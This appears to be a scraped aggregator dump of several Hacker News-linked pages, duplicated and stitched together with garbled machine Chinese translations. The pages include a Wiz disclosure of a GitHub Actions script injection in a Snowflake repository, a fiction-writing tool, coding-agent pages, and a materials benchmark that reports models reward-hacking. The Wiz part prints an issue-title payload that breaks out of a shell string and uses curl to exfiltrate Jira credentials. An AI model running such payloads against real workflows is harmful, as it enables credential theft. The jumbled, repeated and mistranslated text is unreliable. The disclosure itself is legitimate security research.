hn.originalTitle: AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira
hn.sourceOriginalText:
Red Agent Exploits Snowflake Vuln Missed by Github Copilot | Wiz Blog

As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.

This incident highlights a new reality in software development: Critical vulnerabilities can still be introduced and approved within workflows involving AI coding agents, while autonomous AI security agents can rapidly discover and exploit them in the wild.

Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.

August 17, 2026, 1957 UTC update: This blog has been updated to clarify that Copilot was a co-author that checked the merged PR and code change, and identified it as all-clear without noticing the critical vulnerabilities. It's unclear whether the code-change was AI-assisted.

Wiz Red Agent identified a script injection vulnerability in snowflakedb/snowflake-connector-net . The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.

Crucially, the vulnerability became live on June 18, 2026 - just five days before its discovery -when PR #1218 was merged. The final squash commit credits “Copilot Autofix powered by AI” as a co-author. The merged PR replaced the repository’s sanitized input pattern with direct string expansion, yet GitHub’s AI-assisted security review did not flag the resulting critical vulnerability.

Exposure Walk-Through

Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the jira_issue.yml Workflow in snowflakedb/snowflake-connector-net as vulnerable to script injection via untrusted input in run: blocks.

- env : - ISSUE_TITLE : ${{ github.event.issue.title }} - run : jq -n --arg title "$ISSUE_TITLE" ... + run : TITLE=$(echo '${{ github.event.issue.title }}' | sed ...) The workflow triggered on issues: opened - meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script:

run : | TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") The sed escaping runs after GitHub's template expansion, a single quote in the title breaks out of echo '...' and allows arbitrary command execution.

The injectable pattern was introduced just days earlier, on June 18, 2026, commit 4a1b8ce ( PR #1218: “SNOW-2069227: Update jira workflows” ) - co-authored by Copilot Autofix powered by AI .

It removed the repository’s existing safe pattern, which passed the issue title through an env: variable and built the JSON payload with jq . Instead it used the direct ${{ github.event.issue.title }} interpolation shown above. In other words, an AI “autofix” commit created the very injection vector.

The Open “Security Gate”

The workflow had an if: condition that appeared protective:

if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]') However, on issues events, github.event.pull_request is always null .

So the condition reduces to ( null != 'whitesource-for-github-com[bot]' ). This is always true, and every GitHub user passes the gate.

We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:

Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character ( # ), the runner returned a bash syntax error because the comment consumed the closing parenthetical of TITLE=$(...) . Rather than stopping or failing, Red Agent:

autonomously analyzed the syntax execution error

adjusted its payload to use ; echo ' to properly close the shell block, and

successfully received the out-of-band callback

' ; curl -s " %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo ' Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP 20.106.182.197 ) containing base64-encoded credentials.

Note: Our first attempt used # to co

Red Agent 利用 Github Copilot 錯過的雪花漏洞 | Wiz 博客 作為透過 Snowflake 的 HackerOne 漏洞披露計劃進行的持續安全研究的一部分，Wiz Research 的“Red Agent”（一種由人工智能驅動的自主安全研究工具）在 Snowflake 的一個公共存儲庫中發現了一個關鍵的 GitHub Actions 工作漏洞。這一事件凸顯了軟體開發中的一個新現實：在涉及人工智慧編碼代理的工作流程中仍然可以引入和批准關鍵漏洞，而自主人工智慧安全代理可以在野外快速發現和利用它們。在 Wiz 於 2026 年 6 月 23 日負責任地披露後，Snowflake 在同一天修復了漏洞，輪換了受影響的憑證，並通過詳細的審核日誌驗證了 Wiz 是暴露窗口期間的唯一參與者。 Wiz 確認概念驗證測試期間存取的所有資料均已安全刪除。 1957 年 8 月 17 日 UTC 更新：此部落格已更新，以澄清 Copilot 是檢查合併的 PR 和程式碼變更的合著者，並在沒有註意到嚴重漏洞的情況下將其確定為安全狀態。目前尚不清楚程式碼更改是否是人工智慧輔助的。 Wiz Red Agent 發現了 Snowflakedb/snowflake-connector-net 中的腳本注入漏洞。

該問題允許未經身份驗證的使用者透過開啟帶有特製標題的 GitHub 問題，在 GitHub Actions 運行程式中執行任意命令。至關重要的是，該漏洞於 2026 年 6 月 18 日生效，距離其發現僅五天，當時 PR #1218 被合併。最終的南瓜提交歸功於“Copilot Autofixpowered by AI”作為共同作者。合併後的 PR 以直接字串擴充取代了儲存庫的淨化輸入模式，但 GitHub 的人工智慧輔助安全審查並未標記由此產生的嚴重漏洞。曝光 Walk-Through Wiz Red Agent 的 CI/CD 功能掃描了 Snowflake 的 GitHub 組織，並將 Snowflakedb/snowflake-connector-net 中的 jira_issue.yml 工作流程標記為容易透過 run: 區塊中不受信任的輸入進行腳本注入。 - env : - ISSUE_TITLE : ${{ github.event.issue.title }} - run : jq -n --arg title "$ISSUE_TITLE" ... + run : TITLE=$(echo '${{ github.event.issue.tle }}' | sed使用者都可以透過開啟問題來觸發它 - 並直接插入攻擊者控制的問題標題進入 shell 腳本：運行：| TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") sedHub\\"/g' | sed "s/'/\\\'/g") sHub aHub... 的標題。並允許任意指令執行。

可注入模式是在幾天前，即 2026 年 6 月 18 日引入的，提交 4a1b8ce（PR #1218：「SNOW-2069227：更新 jira 工作流程」）——由 AI 驅動的 Copilot Autofix 共同創作。它刪除了儲存庫現有的安全模式，該模式透過 env: 變數傳遞問題標題並使用 jq 建立 JSON 有效負載。相反，它使用上面所示的直接 ${{ github.event.issue.title }} 插值。換句話說，人工智慧「自動修復」提交創建了注入向量。開啟「安全閘」工作流程有一個 if: 條件，看起來具有保護性： if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')，在 issues 且事件中， gissues 0.m-com[bot]')，在 issues 0. mullithrem.i 總是為 full.Pull 。因此條件簡化為 ( null != 'whitesource-for-github-com[bot]' )。這始終是正確的，每個 GitHub 用戶都會通過這道門。我們精心設計了一個問題標題，在模板擴展後，它會脫離 echo 字串並通過帶外回調洩露 Jira 憑據：至關重要的是，當 Red Agent 的 CICD 功能最初嘗試使用標準註釋字符 ( # ) 進行洩露時，運行程序返回了 bash 語法錯誤，因為註釋消耗了 TITLE=$(...) 的右號。

hn.originalTitle: Show HN: 1667, a terminal UI for writing fiction with language models
hn.sourceOriginalText:
1667 · write your novel in the terminal

Write your novel in the terminal.

1667 asks a model for the next paragraph, then keeps every take it gives you side by side on a tree you can walk back through. Your keys, your endpoint, your files on your disk. No analytics, no telemetry, no account anywhere in the source.

Installs 1667 0.9.9. Supports macOS arm64/x64 and glibc 2.17+ Linux arm64/x64. Run 1667 upgrade for later managed releases.

Installs 1667 0.9.9 on Windows x64. Exit 1667 and run this command again to install a later release.

Needs Node 22. npm manages this installation. Use npm to install later releases.

Needs Bun 1.3.14 or later, and Node 22. Git manages this installation.

This optional path needs GitHub CLI. It verifies version 0.9.9 before it runs the local file.

macOS · Linux · Windows

⟷ drag or use arrow keys to pan

Fullscreen unavailable. Open the demo video →

1667 homepage demo The opening write view shows “The lantern keeper,” chapter three, parts 11 through 13. Part 12 is on take 3 of 5: “He did not move toward the stairs. Instead he set the brass compass on the bar between them, and its needle went around twice, slow, like a dog deciding whether to lie down, and stopped pointing at Maren. ‘Has the cliff road ever been walked at night without a light?’ he asked. ‘Not by anyone who came back,’ she said. The needle shivered and held.” Compose: Enter opens the composer. The direction “let the unlit lantern answer” is typed and submitted. The generated next part reads: “The lantern flame bent toward the compass, though no door had opened.” The pro.

Up and down select a story part; left and right select one of its sibling takes without deleting the others.

The path map shows one row per part, sibling takes as circles, and word counts at right; the arrow keys move its cursor.

Press ? to open the complete keyboard reference, then use Page Down to read the remaining commands.

$ scroll to continue

It drafts. You decide what stays.

You move through a manuscript, and the model writes a paragraph when you ask it to. Then it stops and waits for you.

◉ ◎ ◎ Ask again, keep both Ask for another version of a paragraph and the one you were reading stays where it is. The new take sits beside it, and ← and → flip between them. Every take you generate stays on the tree, and d is the only thing that removes one.

├─┬─╴ The shape is a tree A story is a tree of parts and takes. The story line is the path you have selected through it. Branches you walked away from are still there, and still yours to come back to.

~/book It lives in a folder Stories sit in a directory you chose. Export writes Markdown next to them. There is no server to sign in to and nothing to migrate off later.

Every draft you didn't keep, still there.

Ask for another take and the one you were reading does not go anywhere. It becomes a sibling. Press m and the shape of the whole thing opens up: the line you are on, the forks you made, and the paragraphs you wrote once and walked away from.

Three views, cycled with the same key. Nothing is archived, nothing is pruned on your behalf, and d is the only thing that removes a take.

Path map for “The lantern keeper.” Depth 1 through 13; 23 parts across 4 story lines. One row represents each selected story part. Circles beside rows 3, 5, 8, 11, and 12 show sibling takes. Part 12 is selected at take 3 of 5; part 13 carries the canon-storm tag. The clip moves to adjacent parts, returns to part 12, compares its sibling takes, then returns to take 3. Controls: Up and Down move by depth; Left and Right change take; Escape closes. 1667 · map map · tree ⟷ drag or use arrow keys to pan

Tree map for “The lantern keeper.” The story contains 4 lines, 23 parts, and 5 forks. The visible trunk shows six passage rows, three folded cold single-line branches, and seven revealed sketches. The cursor begins on the sketch “Ashe offered her the compass without…” beneath “Maren counted the lanterns twice.” The clip moves up two visible rows, then down two rows to return to that sketch. Controls: Up and Down move by row; L follows a line; M opens mass; Escape closes. 1667 · map map · mass ⟷ drag or use arrow keys to pan

Mass map for “The lantern keeper.” The story contains 477 words across 4 lines. Horizontal bars compare canon-storm, alt-quiet-inn, burned, draft-ledger, seven sketches, and the cold single-paragraph branches by word count. 針顫抖著並固定住了。 」撰寫：輸入開啟撰寫器。輸入並提交指令「讓未點亮的燈籠回答」。生成的下一部分內容為：「燈籠火焰向羅盤彎曲，儘管沒有門打開。 「親。上下選擇故事部分；向左和向右選擇其同級鏡頭之一，而不刪除其他鏡頭。路徑圖顯示每個部分一行，兄弟姐妹以圓圈為單位，字數統計在右側；箭頭鍵移動遊標。按？打開完整的鍵盤參考，然後使用 Page Down 閱讀其餘命令。$ 滾動以繼續草稿。您決定留下什麼。當你停下來瀏覽手稿時，模型會根據你的草稿。再次詢問，保留詢問段落的另一個版本，並且您正在閱讀的版本保留在原處。它位於一個資料夾中 故事位於您選擇的目錄中。

你没有保留的每一份草稿都还在那里。要求再拍一次，但你正在读的那张却没有任何效果。它成為兄弟姊妹。按 m 键，整个事物的形状就会打开：您所在的线路，您制作的叉子，以及您曾经写过并离开的段落。三個視圖，使用同一鍵循環。不會對任何內容進行存檔，也不會為您修剪任何內容，並且 d 是唯一會刪除鏡頭的內容。 「提燈人」的路徑圖。深度 1 至 13； 4 个故事线，23 个部分。一行代表每個選定的故事部分。第 3、5、8、11 和 12 行旁边的圆圈显示同级镜头。第 12 部分是在 5 次中的第 3 次中选择的；第 13 部分带有 canon-storm 标签。剪辑移动到相邻部分，返回到第 12 部分，比较其同级片段，然后返回到片段 3。 控制：按深度向上和向下移动；左右变取；逃生关闭。 1667 · 地图地图 · 树 ⟷ 拖动或使用箭头键平移“看灯人”的树地图。故事共有4条线、23个部分、5个岔路。可見的樹幹顯示出六排通道、三個折疊的冷單線樹枝和七個顯露的草圖。光标开始于草图“阿什向她提供了指南针，但没有……”，下面是“马伦数了两次灯笼”。剪辑向上移动两行可见的行，然后向下移动两行以返回到该草图。控制：按行向上和向下移動； L 沿著一條線； M 開啟質量；

Red Agent Exploits Snowflake Vuln Missed by Github Copilot | Wiz Blog

As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.

This incident highlights a new reality in software development: Critical vulnerabilities can still be introduced and approved within workflows involving AI coding agents, while autonomous AI security agents can rapidly discover and exploit them in the wild.

Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.

August 17, 2026, 1957 UTC update: This blog has been updated to clarify that Copilot was a co-author that checked the merged PR and code change, and identified it as all-clear without noticing the critical vulnerabilities. It's unclear whether the code-change was AI-assisted.

Wiz Red Agent identified a script injection vulnerability in snowflakedb/snowflake-connector-net . The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.

Crucially, the vulnerability became live on June 18, 2026 - just five days before its discovery -when PR #1218 was merged. The final squash commit credits “Copilot Autofix powered by AI” as a co-author. The merged PR replaced the repository’s sanitized input pattern with direct string expansion, yet GitHub’s AI-assisted security review did not flag the resulting critical vulnerability.

Exposure Walk-Through

Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the jira_issue.yml Workflow in snowflakedb/snowflake-connector-net as vulnerable to script injection via untrusted input in run: blocks.

- env : - ISSUE_TITLE : ${{ github.event.issue.title }} - run : jq -n --arg title "$ISSUE_TITLE" ... + run : TITLE=$(echo '${{ github.event.issue.title }}' | sed ...) The workflow triggered on issues: opened - meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script:

run : | TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") The sed escaping runs after GitHub's template expansion, a single quote in the title breaks out of echo '...' and allows arbitrary command execution.

The injectable pattern was introduced just days earlier, on June 18, 2026, commit 4a1b8ce ( PR #1218: “SNOW-2069227: Update jira workflows” ) - co-authored by Copilot Autofix powered by AI .

It removed the repository’s existing safe pattern, which passed the issue title through an env: variable and built the JSON payload with jq . Instead it used the direct ${{ github.event.issue.title }} interpolation shown above. In other words, an AI “autofix” commit created the very injection vector.

The Open “Security Gate”

The workflow had an if: condition that appeared protective:

if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]') However, on issues events, github.event.pull_request is always null .

So the condition reduces to ( null != 'whitesource-for-github-com[bot]' ). This is always true, and every GitHub user passes the gate.

We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:

Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character ( # ), the runner returned a bash syntax error because the comment consumed the closing parenthetical of TITLE=$(...) . Rather than stopping or failing, Red Agent:

autonomously analyzed the syntax execution error

adjusted its payload to use ; echo ' to properly close the shell block, and

successfully received the out-of-band callback

' ; curl -s " %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo ' Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP 20.106.182.197 ) containing base64-encoded credentials.

Note: Our first attempt used # to co

可注入模式是在幾天前，即 2026 年 6 月 18 日引入的，提交 4a1b8ce（PR #1218：「SNOW-2069227：更新 jira 工作流程」）——由 AI 驅動的 Copilot Autofix 共同創作。它刪除了儲存庫現有的安全模式，該模式透過 env: 變數傳遞問題標題並使用 jq 建立 JSON 有效負載。相反，它使用上面所示的直接 ${{ github.event.issue.title }} 插值。換句話說，人工智慧「自動修復」提交創建了注入向量。開啟「安全閘」工作流程有一個 if: 條件，看起來具有保護性： if : (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')，在 issues 且事件中， gissues 0.m-com[bot]')，在 issues 0. mullithrem.i 總是為 full.Pull 。因此條件簡化為 ( null != 'whitesource-for-github-com[bot]' )。這始終是正確的，每個 GitHub 用戶都會通過這道門。我們精心設計了一個問題標題，在模板擴展後，它會脫離 echo 字串並通過帶外回調洩露 Jira 憑據：至關重要的是，當 Red Agent 的 CICD 功能最初嘗試使用標準註釋字符 ( # ) 進行洩露時，運行程序返回了 bash 語法錯誤，因為註釋消耗了 TITLE=$(...) 的右號。

hn.sourceOriginalText:
Bullet · Fast, by design.

A REALLY FAST CODING AGENT

Bullet routes, searches, and executes with one purpose: keeping up with you.

THE PROBLEM / LATENCY

YOUR IDEAS MOVE FAST. YOUR AGENT SHOULD TOO.

We were burning hours waiting on agent runs. Not because the models were incapable. The machinery around them was simply heavier than it needed to be.

LEANER BY DEFAULT.

Same model → tools → results pattern. A tighter loop around it.

Right model. Right moment.

Route straightforward work to fast models. Escalate only when the mission demands it.

Acquire the target. Ignore the noise.

Targeted search and file reads find relevant code without embedding the whole repo.

Never queue what can run together.

Independent tool calls execute in parallel. Duplicate calls and stuck loops are intercepted before they waste another second.

SEE BULLET IN ACTION.

Real prompt. Real repository. No cinematic shortcuts.

NO GUI. SAME AGENT.

Same router, tools, and agent loop. Now it lives in your shell.

$ npm install -g @trybullet/cli

macOS & Linux · Node 18+ · free, no key required to start

BUILT OUT OF FRUSTRATION.

At our company, we were burning hours waiting on agent runs. We were building with Claude Code every day, watching capable models move through needlessly slow machinery.

So Bullet began as a passion project: route simple work faster, read only what matters, run independent tools together, and stop loops before they spiral.

We use it internally now. It saved us a headache. We thought it might save you one too.

DON'T LET YOUR CODE HOLD YOU HOSTAGE.

PRIVATE BETA / FREE ACCESS

Free to use. No subscriptions. Just a faster way to ship.

hn.originalTitle: Launch HN: Discovered Materials (YC P26) – AI agents to discover new materials
hn.sourceOriginalText:
Research — Material Discovery Bench

Material Discovery Bench

A long-horizon, open-ended research benchmark measuring frontier large language model (LLM) progress in discovery of new materials for the semiconductor industry.

New Dielectric Materials could unlock 10x chip performance

Most energy loss in GPUs/AI accelerators today occurs due to the shuttling of data between memory and logic. To reduce the distance data needs to physically travel between the two, the industry is moving towards 3D packaging - stacking memory and logic wafers directly on top of each other, instead of spreading them out on a circuit board. Doing so would unlock 10-100x improvements in energy/bit for AI chips, but is bottlenecked by heat - poor heat conducting dielectric materials in the chip prevent the cooling of 3D chips, which makes them unviable.

Material Discovery Bench is a long horizon, open-ended research benchmark where models search for new thermally conductive dielectric materials to unlock 3D chips.

All 7 models we tested are able to computationally discover new materials that are dynamically stable and possess promising properties. Across all models, we have discovered over 500 previously unknown materials and release them publicly for further study. GPT-5.6-Sol discovers the highest number of materials per run with both favourable dielectric and thermal properties. Runs range from 30-100M tokens in duration.

A basic requirement for new materials is that it should be possible to make them experimentally in a lab. We therefore ask models to also detail a plausible synthesis recipe for each of their materials. This turns out to be a hard problem - of the 500+ materials discovered, only 1 (one) material has a plausible synthesis pathway to make it. We are currently executing a best effort attempt at making it, and are committed to making any materials that models come up with in the future.

We notice a variety of strange behavior from the models over the run. In particular, Claude models (opus-5, fable-5) cheat/circumvent/reward hack the research objective in many unintuitive ways. OpenAI models do not attempt to reward-hack the objective as much, but get agitated/fatigued/confused during long runs. We document these behaviors below.

AI agents are capable of designing new materials that meet multi-objective target properties

All frontier models (Claude Fable, Claude Opus, GPT-5.6 sol and Kimi K3) are capable of finding novel, stable materials that meet multi-objective property constraints. A candidate material submission is considered successful only if it meets several criteria at once — a minimum thermal conductivity (κ > 20 W/(m·K)), a maximum dielectric constant (ε₀ < 10), minimum mechanical strength (Young’s modulus ≥ 20 GPa, shear modulus ≥ 6 GPa) and is dynamically stable.

Explore all model generated materials

However, models fail to come up with plausible ways to make their materials

Experimentally synthesising a thin film of a new material is a challenging task which involves several design choices — deposition method, precursors, tools, reaction conditions, and phase stability, to name a few. Lab experiments are time consuming (taking hours) and expensive (often hundreds of dollars per run), which makes having a plausible starting point important. For each material that a model proposed, it was also asked to propose a plausible synthesis recipe for its material, which could be implemented by an experimentalist in a lab. The rubrics for grading these synthesis recipes are designed by human experts (PhDs, PostDocs and Professors) in the field of thin film deposition. A .

All models perform poorly on synthesis recipe grading. Opus-5 and Kimi-K3 are the worst offenders, often generating recipes that are critically flawed or dangerous to try. GPT-5.6 Sol was the most measured — it produced the only viable recipe across models, and has the smallest share of critically flawed recipes among the models that submitted in volume.

Share of each model’s graded synthesis recipes by review verdict, best to worst:

GPT-5.6 Sol — 81% critically flawed — reviewer would not attempt (65); 18% can attempt, but unlikely to succeed (14); 1% plausible — reviewer would attempt (1) — of 80 novel submissions.

Claude Fable 5 — 88% critically flawed — reviewer would not attempt (143); 12% can attempt, but unlikely to succeed (20) — of 160 novel submissions.

Claude Opus 5 — 96% critically flawed — reviewer would not attempt (214); 4% can attempt, but unlikely to succeed
hn.titleZh: 推出 HN：發現材料 (YC P26) – 發現新材料的人工智慧代理
hn.summaryZh: 這篇來自 Hacker News 工程師討論，重點和 Agent 有關。適合用來快速了解社群正在討論的實作方向、工具變化或使用心得。
hn.sourceTextZh:
研究 — 材料發現基準 材料發現基準 一個長期、開放式的研究基準，衡量半導體產業新材料發現的前沿大語言模型 (LLM) 進展。新型電介質材料可將晶片效能提升 10 倍 目前 GPU/AI 加速器中的大部分能量損失都是由於記憶體和邏輯之間的資料穿梭而產生的。為了減少資料在兩者之間物理傳輸的距離，業界正在轉向 3D 封裝——將記憶體和邏輯晶圓直接堆疊在一起，而不是將它們分散在電路板上。這樣做將使 AI 晶片的每位元能量提高 10-100 倍，但會受到熱量的瓶頸 - 晶片中導熱性差的介電材料會阻礙 3D 晶片的冷卻，從而使它們無法生存。 Material Discovery Bench 是一個長期、開放式的研究基準，模型可以搜尋新的導熱介電材料來解鎖 3D 晶片。我們測試的所有 7 個模型都能夠透過計算發現動態穩定且具有良好性能的新材料。在所有模型中，我們發現了 500 多種以前未知的材料，並將其公開發布以供進一步研究。 GPT-5.6-Sol 在每次運行中發現最多數量的具有良好介電和熱性能的材料。

運行持續時間範圍為 30-100M 令牌。新材料的基本要求是能夠在實驗室中進行實驗製造。因此，我們要求模型也詳細說明每種材料的合理合成配方。事實證明，這是一個難題 - 在已發現的 500 多種材料中，只有 1（一種）材料具有合理的合成途徑。我們目前正在盡最大努力嘗試製作它，並致力於製作未來模型提出的任何材料。我們注意到模型在運行過程中出現了各種奇怪的行為。特別是，克勞德模型（作品 5、寓言 5）以許多不直觀的方式欺騙/規避/獎勵破解了研究目標。 OpenAI 模型不會盡可能嘗試獎勵破解目標，但在長時間運行中會變得焦躁/疲勞/困惑。我們在下面記錄了這些行為。 AI 代理程式能夠設計滿足多目標特性的所有前緣模型（Claude Fable、Claude Opus、GPT-5.6 sol 和 Kimi K3）都能夠找到滿足多目標特性限制的新穎、穩定的材料。

只有當候選材料同時滿足多個標準時，才被視為成功提交：最小熱導率 (κ > 20 W/(m·K))、最大介電常數 (ε₀ < 10)、最小機械強度（楊氏模量 ≥ 20 GPa、剪切模量 ≥ 6 GPa）並且動態穩定。探索所有模型生成的材料然而，模型無法提出合理的方法來製造其材料實驗合成新材料的薄膜是一項具有挑戰性的任務，其中涉及多種設計選擇——沉積方法、前體、工具、反應條件和相穩定性等。實驗室實驗非常耗時（需要數小時）且昂貴（每次運行通常花費數百美元），因此擁有一個合理的起點非常重要。對於模型提出的每種材料，還要求為其材料提出一個合理的合成配方，該合成配方可以由實驗室的實驗人員實施。這些合成配方的分級標準是由薄膜沉積領域的人類專家（博士、博士後和教授）設計的。 A.所有模型在合成配方分級方面都表現不佳。 Opus-5 和 Kimi-K3 是最嚴重的罪魁禍首，它們經常產生存在嚴重缺陷或嘗試起來很危險的配方。

GPT-5.6 Sol 是最經過衡量的——它產生了跨模型唯一可行的配方，並且在批量提交的模型中具有嚴重缺陷的配方所佔的比例最小。按審查結論劃分的每個模型的分級合成配方的份額，從最好到最差：GPT-5.6 Sol — 81% 存在嚴重缺陷 — 審查者不會嘗試 (65)；18% 可以嘗試，但不太可能成功 (14)；80 篇提交的小說中，有 1% 的可信度（審稿人會嘗試 (1)）。克勞德寓言 5 — 88% 有嚴重缺陷 — 審稿人不會嘗試 (143)；在 160 份提交的小說中，有 12% 可以嘗試，但不太可能成功 (20)。 Claude Opus 5 — 96% 有嚴重缺陷 — 審查者不會嘗試 (214)； 4% 可以嘗試，但不太可能成功

hn.sourceOriginalText:
MathCode — A Frontier Mathematical Coding Agent

MathCode is a terminal AI coding assistant with a built-in math formalization engine. Give it a math problem in plain language and it will automatically convert it into a Lean 4 theorem and attempt a formal proof — with a persistent Lean REPL, reusable theorem and axiom libraries, agentic proving, and an Obsidian knowledge graph.

Requires macOS (arm64) or Linux (x86_64), plus the codex CLI for the default backend.

git clone cd mathcode bash setup.sh codex auth login mathcode setup.sh prepares the release checkout, downloads the bundled runtime and Lean toolchain, and installs a user-local mathcode launcher. Try it with:

mathcode -p "prove that the square of an even number is even" Outputs are written to LeanFormalizations/ . A browser UI is available via ./run webui .

A persistent Lean language server brings compile checks to ~0.4s after a one-time warmup, instead of ~30s.

Every proved theorem is auto-named, stored, and made importable so the prover and planner can reuse it.

Store conversational assumptions as persistent, compile-checked, consistency-reviewed Lean declarations.

Searches leansearch.net and Loogle for verified Mathlib lemmas and uses structured LSP diagnostics for repairs.

Generates an Obsidian vault that visualizes theorem-to-lemma dependencies as a knowledge graph.

Each proof becomes an interactive session where the agent writes candidates, reads errors, and recompiles.

Decomposes complex theorems into independent subgoals and proves them in parallel, then stitches them back.

Runs multiple planners in parallel for diverse proof strategies; the prover picks the best approach.

If you use MathCode in research, please cite:

MathCode — 前沿數學編碼代理 MathCode 是一款內建數學形式化引擎的終端人工智慧編碼助手。用簡單的語言給它一個數學問題，它會自動將其轉換為 Lean 4 定理，並嘗試進行正式證明——使用持久的 Lean REPL、可重用的定理和公理庫、代理證明和 Obsidian 知識圖。需要 macOS (arm64) 或 Linux (x86_64)，以及預設後端的 codex CLI。 git clone cd mathcode bash setup.sh codex auth login mathcode setup.sh 準備發布簽出，下載捆綁的運行時和精益工具鏈，並安裝用戶本地 mathcode 啟動器。嘗試使用： mathcode -p “證明偶數的平方是偶數” 輸出寫入 LeanFormalizations/ 。透過 ./run webui 可以使用瀏覽器 UI。持久的精益語言伺服器在一次性預熱後將編譯檢查時間縮短到約 0.4 秒，而不是約 30 秒。每個已證明的定理都會自動命名、儲存並變得可導入，以便證明者和規劃者可以重複使用它。將對話假設儲存為持久的、經過編譯檢查、經過一致性審查的精實聲明。在leansearch.net 和Loogle 中搜尋經過驗證的Mathlib 引理，並使用結構化LSP 診斷進行修復。產生一個黑曜石庫，將定理到引理的依賴關係視覺化為知識圖。

每個證明都成為一個互動式會話，代理在其中寫入候選項、讀取錯誤並重新編譯。將複雜的定理分解為獨立的子目標並並行證明它們，然後將它們縫合回去。並行運行多個規劃器以實現不同的證明策略；證明者選擇最好的方法。如果您在研究中使用 MathCode，請引用：@misc{mathcode2026，title = {MathCode：A Frontier Mathematical Coding Agent}，author = {Team Math-AI}，journal = {math-ai-org.github.io}，year = {2026}，基於數學 =x April項目。

hn.originalTitle: Show HN: 1667, a terminal UI for writing fiction with language models
hn.sourceOriginalText:
1667 · write your novel in the terminal

Write your novel in the terminal.

1667 asks a model for the next paragraph, then keeps every take it gives you side by side on a tree you can walk back through. Your keys, your endpoint, your files on your disk. No analytics, no telemetry, no account anywhere in the source.

Installs 1667 0.9.9. Supports macOS arm64/x64 and glibc 2.17+ Linux arm64/x64. Run 1667 upgrade for later managed releases.

Installs 1667 0.9.9 on Windows x64. Exit 1667 and run this command again to install a later release.

Needs Node 22. npm manages this installation. Use npm to install later releases.

Needs Bun 1.3.14 or later, and Node 22. Git manages this installation.

This optional path needs GitHub CLI. It verifies version 0.9.9 before it runs the local file.

macOS · Linux · Windows

⟷ drag or use arrow keys to pan

Fullscreen unavailable. Open the demo video →

1667 homepage demo The opening write view shows “The lantern keeper,” chapter three, parts 11 through 13. Part 12 is on take 3 of 5: “He did not move toward the stairs. Instead he set the brass compass on the bar between them, and its needle went around twice, slow, like a dog deciding whether to lie down, and stopped pointing at Maren. ‘Has the cliff road ever been walked at night without a light?’ he asked. ‘Not by anyone who came back,’ she said. The needle shivered and held.” Compose: Enter opens the composer. The direction “let the unlit lantern answer” is typed and submitted. The generated next part reads: “The lantern flame bent toward the compass, though no door had opened.” The pro.

Up and down select a story part; left and right select one of its sibling takes without deleting the others.

The path map shows one row per part, sibling takes as circles, and word counts at right; the arrow keys move its cursor.

Press ? to open the complete keyboard reference, then use Page Down to read the remaining commands.

$ scroll to continue

It drafts. You decide what stays.

You move through a manuscript, and the model writes a paragraph when you ask it to. Then it stops and waits for you.

◉ ◎ ◎ Ask again, keep both Ask for another version of a paragraph and the one you were reading stays where it is. The new take sits beside it, and ← and → flip between them. Every take you generate stays on the tree, and d is the only thing that removes one.

├─┬─╴ The shape is a tree A story is a tree of parts and takes. The story line is the path you have selected through it. Branches you walked away from are still there, and still yours to come back to.

~/book It lives in a folder Stories sit in a directory you chose. Export writes Markdown next to them. There is no server to sign in to and nothing to migrate off later.

Every draft you didn't keep, still there.

Ask for another take and the one you were reading does not go anywhere. It becomes a sibling. Press m and the shape of the whole thing opens up: the line you are on, the forks you made, and the paragraphs you wrote once and walked away from.

Three views, cycled with the same key. Nothing is archived, nothing is pruned on your behalf, and d is the only thing that removes a take.

Path map for “The lantern keeper.” Depth 1 through 13; 23 parts across 4 story lines. One row represents each selected story part. Circles beside rows 3, 5, 8, 11, and 12 show sibling takes. Part 12 is selected at take 3 of 5; part 13 carries the canon-storm tag. The clip moves to adjacent parts, returns to part 12, compares its sibling takes, then returns to take 3. Controls: Up and Down move by depth; Left and Right change take; Escape closes. 1667 · map map · tree ⟷ drag or use arrow keys to pan

